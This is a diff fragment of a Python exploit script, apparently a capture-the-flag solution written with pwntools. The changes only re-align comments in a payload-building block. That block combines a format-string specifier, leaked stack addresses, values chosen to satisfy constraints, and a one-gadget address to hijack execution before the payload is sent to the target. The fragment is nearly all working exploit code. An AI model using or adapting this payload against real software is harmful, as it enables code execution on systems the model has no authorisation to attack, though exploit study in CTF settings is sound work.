@@ -665,23 +665,23 @@ leak(stack_addr, 0x40, "&payload")
 stack_addr += 8
 
 payload =  "%13$@" + "ZZZ"
-payload += p64(stack_addr) 				# RBX (stack_addr)
+payload += p64(stack_addr)           # RBX (stack_addr)
 payload += "A2"*4
 payload += "B1"*4
 payload += "B2"*4
-payload += p64(1) 						# cond_3 : *cond_3 & 2 != 0
+payload += p64(1)                    # cond_3 : *cond_3 & 2 != 0
 payload += "C2"*4
 payload += "D1"*4
 payload += "D2"*4
-payload += p64(stack_addr+0x50)         # p64(stack_addr+0x50) -> RDX
+payload += p64(stack_addr+0x50)      # p64(stack_addr+0x50) -> RDX
 payload += "E2"*4
-payload += p64(stack_addr+0x50)	        # RDX (=stck_addr+0x50)
-payload += p64(stack_addr+0x50+0x30)	# cond_1 : *&cond_1 = 0
+payload += p64(stack_addr+0x50)      # RDX (=stck_addr+0x50)
+payload += p64(stack_addr+0x50+0x30) # cond_1 : *&cond_1 = 0
 payload += p64(one_shot)
 payload += "G2"*4
 payload += "H1"*4
-payload += p64(0x10) 					# cond_1 : < 0x70
-payload += p64(0)						# cond_2 : cond_1
+payload += p64(0x10)                 # cond_1 : < 0x70
+payload += p64(0)                    # cond_2 : cond_1
 
 leak(stack_addr, 0x80, "&payload")
 p.sendline(payload)
